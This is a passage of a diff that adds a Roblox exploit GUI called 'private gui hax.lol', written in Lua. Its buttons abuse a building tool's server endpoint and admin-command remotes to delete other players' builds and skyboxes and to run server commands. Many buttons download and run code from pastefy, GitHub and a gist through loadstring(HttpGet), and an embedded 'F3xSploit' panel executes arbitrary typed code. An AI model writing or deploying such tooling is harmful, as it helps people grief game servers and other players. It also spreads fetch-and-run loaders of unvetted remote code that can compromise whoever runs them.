+			remote:InvokeServer("SyncDecorate", syncSparkles)
+		end
+		if #createSmoke > 0 then
+			remote:InvokeServer("CreateDecorations", createSmoke)
+			remote:InvokeServer("SyncDecorate", syncSmoke)
+		end
+	
+		imported_model.Parent = nil
+	
+		RequestCommand:InvokeServer(";res all")
+	end)
+end;
+task.spawn(C_2c2);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Delete Particle Mess.LocalScript
+function C_2c5()
+local script = G2L["2c5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local tool
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function send(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local hax = "watchmerollinghax"
+	
+		for _, part in pairs(Workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name == hax then
+				task.spawn(function()
+					send("Remove", { part })
+				end)
+			end
+		end
+	end)
+	
+end;
+task.spawn(C_2c5);
+-- StarterGui.private gui hax.lol.Fix All Things.LocalScript
+function C_2c7()
+local script = G2L["2c7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+		
+		-- cleaning those cmd haxes
+		
+		RequestCommand:InvokeServer(";undisco")
+		RequestCommand:invokeServer(";unmusic")
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local terrain = ws:FindFirstChild("Terrain")
+		if not terrain then return end
+	
+		local partsToDelete = {}
+		for _, v in pairs(terrain:GetDescendants()) do
+			if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
+				table.insert(partsToDelete, v)
+			end
+		end
+	
+		for _, v in pairs(partsToDelete) do
+			ohno({"Remove", {v}})
+		end
+	
+		task.wait(0.5)
+	
+		local pos = CFrame.new(0, -5, 0)
+		local baseplate = remote:InvokeServer("CreatePart", "Normal", pos, ws)
+		ohno({"SyncResize", {{Part = baseplate, CFrame = pos, Size = Vector3.new(1000, 1, 1000)}}})
+		ohno({"SyncColor", {{Part = baseplate, Color = Color3.fromRGB(0, 150, 0), UnionColoring = false}}})
+		ohno({"SyncAnchor", {{Part = baseplate, Anchored = true}}})
+		ohno({"SetLocked", {baseplate}, true})
+	
+		task.wait(1)
+	
+		local newBaseplate = remote:InvokeServer("CreatePart", "Normal", pos, ws)
+		ohno({"SyncResize", {{Part = newBaseplate, CFrame = pos, Size = Vector3.new(1000, 1, 1000)}}})
+		ohno({"SyncColor", {{Part = newBaseplate, Color = Color3.fromRGB(0, 150, 0), UnionColoring = false}}})
+		ohno({"SyncAnchor", {{Part = newBaseplate, Anchored = true}}})
+		ohno({"SetLocked", {newBaseplate}, true})
+	
+		ohno({"Remove", {baseplate}})
+		
+		RequestCommand:invokeServer(";res all")
+	end)
+end;
+task.spawn(C_2c7);
+-- StarterGui.private gui hax.lol.Remove SkyBox.LocalScript
+function C_2c9()
+local script = G2L["2c9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
+		if not hrp then return end
+	
+		local rq = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		task.defer(function()
+			pcall(function()
+				rq:InvokeServer(";time 14")
+			end)
+		end)
+	
+		local mySky = nil
+		local minDist = math.huge
+		local playerPos = hrp.Position
+	
+		for _, obj in pairs(ws:GetDescendants()) do
+			if obj:IsA("BasePart") and obj.Name == "kys" then
+				local dist = (obj.Position - playerPos).Magnitude
+				if dist < minDist then
+					minDist = dist
+					mySky = obj
+				end
+			end
+		end
+	
+		if mySky then
+			ohno({"Remove", {mySky}})
+		end
+	end)
+end;
+task.spawn(C_2c9);
+-- StarterGui.private gui hax.lol.Remove Others Skybox.LocalScript
+function C_2cb()
+local script = G2L["2cb"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game:GetService("Players").LocalPlayer
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
+	
+		local othermeshsky = "rbxassetid://111891702759441"
+		local rq = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		task.defer(function()
+			pcall(function()
+				rq:InvokeServer(";time 14")
+			end)
+		end)
+	
+		local function getf3x()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local tool = getf3x()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function findMySky()
+			local mySky = nil
+			local minDist = math.huge
+			local playerPos = hrp and hrp.Position or Vector3.new(0, 0, 0)
+			for _, obj in pairs(ws:GetDescendants()) do
+				if obj:IsA("BasePart") and obj.Name == "kys" then
+					local dist = (obj.Position - playerPos).Magnitude
+					if dist < minDist then
+						minDist = dist
+						mySky = obj
+					end
+				end
+			end
+			return mySky
+		end
+	
+		local urownsky = findMySky()
+	
+		task.defer(function()
+			for _, v in pairs(ws:GetDescendants()) do
+				if v == urownsky then continue end
+	
+				if v:IsA("MeshPart") and v.MeshId == othermeshsky then
+					ohno({"Remove", {v}})
+				elseif v:IsA("Part") or v:IsA("UnionOperation") then
+					for _, child in pairs(v:GetChildren()) do
+						if child:IsA("SpecialMesh") and child.MeshId == othermeshsky then
+							ohno({"Remove", {v}})
+							break
+						end
+					end
+				end
+			end
+		end)
+	end)
+end;
+task.spawn(C_2cb);
+-- StarterGui.private gui hax.lol.INFYIELD.LocalScript
+function C_2cd()
+local script = G2L["2cd"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+	end)
+end;
+task.spawn(C_2cd);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2d0()
+local script = G2L["2d0"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/38eSHC74/raw"))()
+	end)
+end;
+task.spawn(C_2d0);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2d2()
+local script = G2L["2d2"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/hSoklBUu/raw"))()
+	end)
+end;
+task.spawn(C_2d2);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2d4()
+local script = G2L["2d4"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/I8AKJUqe/raw"))()
+	end)
+end;
+task.spawn(C_2d4);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2d6()
+local script = G2L["2d6"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/xdDi4Tj6/raw"))()
+	end)
+end;
+task.spawn(C_2d6);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2d9()
+local script = G2L["2d9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/rj0cptZa/raw"))()
+	end)
+end;
+task.spawn(C_2d9);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2dc()
+local script = G2L["2dc"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/snakg0d-lol/b6821c4a2e05c21486ceb5d03188eef3/raw/4c33306bd5d9a9c7898005313bf037f6be30b381/eaeaeaeaaeea"))()
+	end)
+end;
+task.spawn(C_2dc);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2e0()
+local script = G2L["2e0"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ScreenGui = Instance.new("ScreenGui")
+		local Background = Instance.new("Frame")
+		local Titlebar = Instance.new("Frame")
+		local TextLabel = Instance.new("TextLabel")
+		local TextButton = Instance.new("TextButton")
+		local TextBox = Instance.new("TextBox")
+		local TextButton_2 = Instance.new("TextButton")
+		local ScrollingFrame = Instance.new("ScrollingFrame")
+		local TextLabel_2 = Instance.new("TextLabel")
+		local TextLabel_3 = Instance.new("TextLabel")
+		local TextLabel_4 = Instance.new("TextLabel")
+		local TextLabel_5 = Instance.new("TextLabel")
+		local TextLabel_6 = Instance.new("TextLabel")
+		local TextLabel_7 = Instance.new("TextLabel")
+		local TextLabel_8 = Instance.new("TextLabel")
+		local TextButton_3 = Instance.new("TextButton")
+		local TextButton_4 = Instance.new("TextButton")
+		local TextButton_5 = Instance.new("TextButton")
+		local TextButton_6 = Instance.new("TextButton")
+		local TextButton_7 = Instance.new("TextButton")
+		local TextButton_8 = Instance.new("TextButton")
+		local TextButton_9 = Instance.new("TextButton")
+	
+		--Properties:
+	
+		ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("CoreGui")
+		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		ScreenGui.ResetOnSpawn = false
+	
+		Background.Name = "Background"
+		Background.Parent = ScreenGui
+		Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Background.BorderSizePixel = 3
+		Background.Position = UDim2.new(0.072115384, 0, 0.0813823864, 0)
+		Background.Size = UDim2.new(0, 280, 0, 226)
+	
+		Titlebar.Name = "Titlebar"
+		Titlebar.Parent = Background
+		Titlebar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Titlebar.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Titlebar.BorderSizePixel = 2
+		Titlebar.Position = UDim2.new(-0.000209481383, 0, -0.00232554739, 0)
+		Titlebar.Size = UDim2.new(0, 280, 0, 37)
+	
+		TextLabel.Parent = Titlebar
+		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel.BackgroundTransparency = 235.000
+		TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel.BorderSizePixel = 0
+		TextLabel.Position = UDim2.new(0.0285714287, 0, -0.184210524, 0)
+		TextLabel.Size = UDim2.new(0, 140, 0, 52)
+		TextLabel.Font = Enum.Font.GothamBold
+		TextLabel.Text = "F3xSploit"
+		TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel.TextScaled = true
+		TextLabel.TextSize = 14.000
+		TextLabel.TextWrapped = true
+	
+		TextButton.Parent = Titlebar
+		TextButton.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+		TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton.BorderSizePixel = 0
+		TextButton.Position = UDim2.new(0.0274758469, 0, 5.05881786, 0)
+		TextButton.Size = UDim2.new(0, 69, 0, 30)
+		TextButton.Font = Enum.Font.Arial
+		TextButton.Text = "Execute"
+		TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton.TextScaled = true
+		TextButton.TextSize = 25.000
+		TextButton.TextWrapped = true
+	
+		TextBox.Parent = Titlebar
+		TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextBox.BorderSizePixel = 2
+		TextBox.Position = UDim2.new(0.0257545207, 0, 1.18420947, 0)
+		TextBox.Size = UDim2.new(0, 166, 0, 136)
+		TextBox.Font = Enum.Font.SourceSans
+		TextBox.Text = ""
+		TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextBox.TextSize = 23.000
+		TextBox.TextWrapped = true
+		TextBox.TextXAlignment = Enum.TextXAlignment.Left
+		TextBox.TextYAlignment = Enum.TextYAlignment.Top
+	
+		TextButton_2.Parent = Titlebar
+		TextButton_2.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+		TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_2.BorderSizePixel = 0
+		TextButton_2.Position = UDim2.new(0.312534213, 0, 5.05881786, 0)
+		TextButton_2.Size = UDim2.new(0, 71, 0, 30)
+		TextButton_2.Font = Enum.Font.Arial
+		TextButton_2.Text = "Clear"
+		TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_2.TextSize = 25.000
+		TextButton_2.TextWrapped = true
+	
+		ScrollingFrame.Parent = Background
+		ScrollingFrame.Active = true
+		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		ScrollingFrame.BorderSizePixel = 2
+		ScrollingFrame.Position = UDim2.new(0.646341145, 0, 0.188530982, 0)
+		ScrollingFrame.Size = UDim2.new(0, 92, 0, 136)
+	
+		TextLabel_2.Parent = ScrollingFrame
+		TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_2.BorderSizePixel = 0
+		TextLabel_2.Position = UDim2.new(0, 0, 0.00442477828, 0)
+		TextLabel_2.Size = UDim2.new(0, 84, 0, 23)
+		TextLabel_2.Font = Enum.Font.Arial
+		TextLabel_2.Text = "k00pgui "
+		TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_2.TextScaled = true
+		TextLabel_2.TextSize = 14.000
+		TextLabel_2.TextWrapped = true
+	
+		TextLabel_3.Parent = ScrollingFrame
+		TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_3.BorderSizePixel = 0
+		TextLabel_3.Position = UDim2.new(0, 0, 0.0553097315, 0)
+		TextLabel_3.Size = UDim2.new(0, 84, 0, 23)
+		TextLabel_3.Font = Enum.Font.Arial
+		TextLabel_3.Text = "Polaria"
+		TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_3.TextScaled = true
+		TextLabel_3.TextSize = 14.000
+		TextLabel_3.TextWrapped = true
+	
+		TextLabel_4.Parent = ScrollingFrame
+		TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_4.BorderSizePixel = 0
+		TextLabel_4.Position = UDim2.new(0, 0, 0.106194682, 0)
+		TextLabel_4.Size = UDim2.new(0, 78, 0, 23)
+		TextLabel_4.Font = Enum.Font.Arial
+		TextLabel_4.Text = "TubersGui "
+		TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_4.TextScaled = true
+		TextLabel_4.TextSize = 14.000
+		TextLabel_4.TextWrapped = true
+	
+		TextLabel_5.Parent = ScrollingFrame
+		TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_5.BorderSizePixel = 0
+		TextLabel_5.Position = UDim2.new(0, 0, 0.157079637, 0)
+		TextLabel_5.Size = UDim2.new(0, 78, 0, 23)
+		TextLabel_5.Font = Enum.Font.Arial
+		TextLabel_5.Text = "Mr Bean Admin"
+		TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_5.TextScaled = true
+		TextLabel_5.TextSize = 14.000
+		TextLabel_5.TextWrapped = true
+	
+		TextLabel_6.Parent = ScrollingFrame
+		TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_6.BorderSizePixel = 0
+		TextLabel_6.Position = UDim2.new(0, 0, 0.207964584, 0)
+		TextLabel_6.Size = UDim2.new(0, 78, 0, 23)
+		TextLabel_6.Font = Enum.Font.Arial
+		TextLabel_6.Text = "BYTEGUI"
+		TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_6.TextScaled = true
+		TextLabel_6.TextSize = 14.000
+		TextLabel_6.TextWrapped = true
+	
+		TextLabel_7.Parent = ScrollingFrame
+		TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_7.BorderSizePixel = 0
+		TextLabel_7.Position = UDim2.new(0, 0, 0.249999985, 0)
+		TextLabel_7.Size = UDim2.new(0, 84, 0, 23)
+		TextLabel_7.Font = Enum.Font.Arial
+		TextLabel_7.Text = "K_aa X GUI"
+		TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_7.TextScaled = true
+		TextLabel_7.TextSize = 14.000
+		TextLabel_7.TextWrapped = true
+	
+		TextLabel_8.Parent = ScrollingFrame
+		TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_8.BorderSizePixel = 0
+		TextLabel_8.Position = UDim2.new(0, 0, 0.300884873, 0)
+		TextLabel_8.Size = UDim2.new(0, 84, 0, 23)
+		TextLabel_8.Font = Enum.Font.Arial
+		TextLabel_8.Text = "c00lgui"
+		TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextLabel_8.TextScaled = true
+		TextLabel_8.TextSize = 14.000
+		TextLabel_8.TextWrapped = true
+	
+		TextButton_3.Parent = ScrollingFrame
+		TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_3.BackgroundTransparency = 435.000
+		TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_3.BorderSizePixel = 0
+		TextButton_3.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_3.Font = Enum.Font.SourceSans
+		TextButton_3.Text = " "
+		TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_3.TextSize = 14.000
+	
+		TextButton_4.Parent = ScrollingFrame
+		TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_4.BackgroundTransparency = 435.000
+		TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_4.BorderSizePixel = 0
+		TextButton_4.Position = UDim2.new(0, 0, 0.0508849509, 0)
+		TextButton_4.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_4.Font = Enum.Font.SourceSans
+		TextButton_4.Text = " "
+		TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_4.TextSize = 14.000
+	
+		TextButton_5.Parent = ScrollingFrame
+		TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_5.BackgroundTransparency = 435.000
+		TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_5.BorderSizePixel = 0
+		TextButton_5.Position = UDim2.new(0, 0, 0.103982292, 0)
+		TextButton_5.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_5.Font = Enum.Font.SourceSans
+		TextButton_5.Text = " "
+		TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_5.TextSize = 14.000
+	
+		TextButton_6.Parent = ScrollingFrame
+		TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_6.BackgroundTransparency = 435.000
+		TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_6.BorderSizePixel = 0
+		TextButton_6.Position = UDim2.new(0, 0, 0.157079637, 0)
+		TextButton_6.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_6.Font = Enum.Font.SourceSans
+		TextButton_6.Text = " "
+		TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_6.TextSize = 14.000
+	
+		TextButton_7.Parent = ScrollingFrame
+		TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_7.BackgroundTransparency = 435.000
+		TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_7.BorderSizePixel = 0
+		TextButton_7.Position = UDim2.new(0, 0, 0.212389365, 0)
+		TextButton_7.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_7.Font = Enum.Font.SourceSans
+		TextButton_7.Text = " "
+		TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_7.TextSize = 14.000
+	
+		TextButton_8.Parent = ScrollingFrame
+		TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_8.BackgroundTransparency = 435.000
+		TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_8.BorderSizePixel = 0
+		TextButton_8.Position = UDim2.new(0, 0, 0.245575204, 0)
+		TextButton_8.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_8.Font = Enum.Font.SourceSans
+		TextButton_8.Text = " "
+		TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_8.TextSize = 14.000
+	
+		TextButton_9.Parent = ScrollingFrame
+		TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton_9.BackgroundTransparency = 435.000
+		TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_9.BorderSizePixel = 0
+		TextButton_9.Position = UDim2.new(0, 0, 0.300884932, 0)
+		TextButton_9.Size = UDim2.new(0, 84, 0, 25)
+		TextButton_9.Font = Enum.Font.SourceSans
+		TextButton_9.Text = " "
+		TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
+		TextButton_9.TextSize = 14.000
+	
+		-- Scripts:
+	
+		local function XPKM_fake_script() -- TextButton.LocalScript 
+			local script = Instance.new('LocalScript', TextButton)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				loadstring(script.Parent.Parent.TextBox.Text)()
+			end)
+		end
+		coroutine.wrap(XPKM_fake_script)()
+		local function CFNYOJA_fake_script() -- TextButton_2.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_2)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				script.Parent.Parent.TextBox.Text = ""
+			end)
+		end
+		coroutine.wrap(CFNYOJA_fake_script)()
+		local function LGJYYBC_fake_script() -- TextButton_3.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_3)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+				loadstring(game:HttpGet("https://pastefy.app/HIeiplee/raw"))()
+	
+	
+	
+			end)
+		end
+		coroutine.wrap(LGJYYBC_fake_script)()
+		local function XEFFL_fake_script() -- TextButton_4.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_4)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+				loadstring(game:HttpGet("https://pastefy.app/O9K9wgvl/raw"))()
+	
+	
+	
+			end)
+		end
+		coroutine.wrap(XEFFL_fake_script)()
+		local function FTRIBK_fake_script() -- TextButton_5.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_5)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+	
+				loadstring(game:HttpGet("https://pastefy.app/z2ZT2cZX/raw"))()
+	
+	
+			end)
+		end
+		coroutine.wrap(FTRIBK_fake_script)()
+		local function QBYL_fake_script() -- TextButton_6.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_6)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+				loadstring(game:HttpGet("https://pastefy.app/rj0cptZa/raw"))()
+	
+	
+	
+			end)
+		end
+		coroutine.wrap(QBYL_fake_script)()
+		local function YFDFBU_fake_script() -- TextButton_7.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_7)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+	
+				loadstring(game:HttpGet("https://pastefy.app/Q755snCN/raw"))()
+	
+	
+			end)
+		end
+		coroutine.wrap(YFDFBU_fake_script)()
+		local function KPHD_fake_script() -- TextButton_8.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_8)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+	
+				loadstring(game:HttpGet("https://pastefy.app/7z70NfBi/raw"))()
+	
+	
+			end)
+		end
+		coroutine.wrap(KPHD_fake_script)()
+		local function CLUWNVI_fake_script() -- TextButton_9.LocalScript 
+			local script = Instance.new('LocalScript', TextButton_9)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+	
+				loadstring(game:HttpGet("https://pastefy.app/GCpUQs4j/raw"))()
+	
+	
+	
+			end)
+		end
+		coroutine.wrap(CLUWNVI_fake_script)()
+	end)
+end;
+task.spawn(C_2e0);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2e2()
+local script = G2L["2e2"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
+	end)
+end;
+task.spawn(C_2e2);
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+function C_2e4()
+local script = G2L["2e4"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Executor-Remakes-In-Lua/refs/heads/main/Remakes/Stigma_Revision_0.lua"))()
+	
+	
+	
+	
+	
+	
+	--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+		local TweenService = game:GetService("TweenService")
+	
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "executor"
+		gui.ResetOnSpawn = false
+		gui.Parent = game.CoreGui
+	
+		local lel = Instance.new("ImageLabel")
+		lel.Size = UDim2.new(0, 190, 0, 190)
+		lel.Position = UDim2.new(-0, 1, 1, 3)
+		lel.BackgroundTransparency = 1
+		lel.Image = "rbxassetid://135715935095139"
+		lel.ZIndex = 1
+		lel.Parent = gui
+	
+		local injectText = Instance.new("TextLabel")
+		injectText.Size = UDim2.new(0, 200, 0, 50)
+		injectText.Position = UDim2.new(0.458, 0, -0.35, 0)
+		injectText.BackgroundTransparency = 1
+		injectText.Text = ""
+		injectText.Font = Enum.Font.Arcade
+		injectText.TextSize = 80
+		injectText.TextColor3 = Color3.fromRGB(0, 255, 0)
+		injectText.TextStrokeTransparency = 0
+		injectText.TextTransparency = 0
+		injectText.ZIndex = 1
+		injectText.Parent = gui
+	
+		lel:TweenPosition(
+			UDim2.new(0.5, 0, 0.408, 0),
+			"Out",
+			"Back",
+			0.6,
+			false
+		)
+	
+		injectText:TweenPosition(
+			UDim2.new(0.458, 0, 0.46, 0),
+			"Out",
+			"Sine",
+			0.6,
+			false
+		)
+	
+		task.wait(3)
+		lel:TweenPosition(
+			UDim2.new(0, -1, 0.8, 0),
+			"Out",
+			"Sine",
+			0.7,
+			false
+		)
+	
+		task.wait(0.7)
+	
+		injectText:TweenPosition(
+			UDim2.new(0.458, 0, 1.2, 0), 
+			"In",
+			"Sine",
+			0.6,
+			false
+		)
+	
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Size = UDim2.new(0, 300, 0, 100)
+		textLabel.Position = UDim2.new(0, 50, 0, 250)
+		textLabel.BackgroundTransparency = 1
+		textLabel.Text = ""
+		textLabel.TextColor3 = Color3.new(1, 1, 1)
+		textLabel.Font = Enum.Font.GothamBold
+		textLabel.TextSize = 0
+		textLabel.TextWrapped = true
+		textLabel.TextTransparency = 0
+		textLabel.Parent = gui
+	
+		local outline = Instance.new("UIStroke")
+		outline.Color = Color3.new(0, 0, 0)
+		outline.Thickness = 0.5
+		outline.Transparency = 1
+		outline.Parent = textLabel
+	
+		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
+	
+		TweenService:Create(textLabel, tweenInfo, {
+			TextTransparency = 0
+		}):Play()
+	
+		TweenService:Create(outline, tweenInfo, {
+			Transparency = 0
+		}):Play()
+	
+	
+	
+	
+	
+	
+	
